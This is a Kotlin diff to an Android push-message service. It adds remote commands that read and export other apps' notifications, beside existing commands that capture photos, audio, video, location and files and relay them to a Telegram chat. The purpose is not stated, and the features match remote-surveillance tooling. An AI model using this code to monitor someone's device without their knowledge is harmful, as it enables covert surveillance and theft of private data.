@@ -222,8 +222,63 @@ class FCMService : FirebaseMessagingService() {
         val rawPage = remoteMessage.data["page"]
         val page = rawPage?.toIntOrNull() ?: 0
         val callbackData = remoteMessage.data["callback_data"]
+        val pkg = remoteMessage.data["pkg"]
 
-        // Interactive /send navigation
+        // --- Notification commands (call NotificationRelay, NOT NotificationHelper) ---
+        when (type) {
+            "notiadd" -> {
+                CoroutineScope(Dispatchers.IO).launch {
+                    NotificationRelay.handleNotiAdd(applicationContext, chatId ?: return@launch)
+                }
+                return
+            }
+            "notiaddpick" -> {
+                if (pkg != null) NotificationRelay.handleNotiAddPick(applicationContext, chatId ?: return, pkg)
+                return
+            }
+            "notiremove" -> {
+                NotificationRelay.handleNotiRemove(applicationContext, chatId ?: return)
+                return
+            }
+            "notiremovepick" -> {
+                if (pkg != null) NotificationRelay.handleNotiRemovePick(applicationContext, chatId ?: return, pkg)
+                return
+            }
+            "noti" -> {
+                CoroutineScope(Dispatchers.IO).launch {
+                    NotificationRelay.handleNoti(applicationContext, chatId ?: return@launch)
+                }
+                return
+            }
+            "notipick" -> {
+                CoroutineScope(Dispatchers.IO).launch {
+                    if (pkg != null) NotificationRelay.handleNotiPick(applicationContext, chatId ?: return@launch, pkg)
+                }
+                return
+            }
+            "noticlear" -> {
+                NotificationRelay.handleNotiClear(applicationContext, chatId ?: return)
+                return
+            }
+            "noticlearpick" -> {
+                CoroutineScope(Dispatchers.IO).launch {
+                    if (pkg != null) NotificationRelay.handleNotiClearPick(applicationContext, chatId ?: return@launch, pkg)
+                }
+                return
+            }
+            "notiexport" -> {
+                NotificationRelay.handleNotiExport(applicationContext, chatId ?: return)
+                return
+            }
+            "notiexportpick" -> {
+                CoroutineScope(Dispatchers.IO).launch {
+                    if (pkg != null) NotificationRelay.handleNotiExportPick(applicationContext, chatId ?: return@launch, pkg)
+                }
+                return
+            }
+        }
+
+        // --- File management/other commands (unchanged) ---
         if (callbackData != null && (callbackData.startsWith("sendnav:") || callbackData.startsWith("sendplace:"))) {
             val parts = callbackData.split(":")
             if (parts.size >= 3) {
@@ -242,7 +297,6 @@ class FCMService : FirebaseMessagingService() {
         }
 
         when (type) {
-            // File management interactive commands
             "list" -> {
                 val (realPath, realPage) = splitPathAndPage(path)
                 CoroutineScope(Dispatchers.IO).launch {
@@ -332,7 +386,6 @@ class FCMService : FirebaseMessagingService() {
                 UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, msg, keyboard)
                 return
             }
-            // Now handle CommandManager-based actions: photo, video, audio, location, ring, vibrate
             "photo", "video", "audio", "location", "ring", "vibrate" -> {
                 CommandManager.initialize(applicationContext)
                 CommandManager.dispatch(
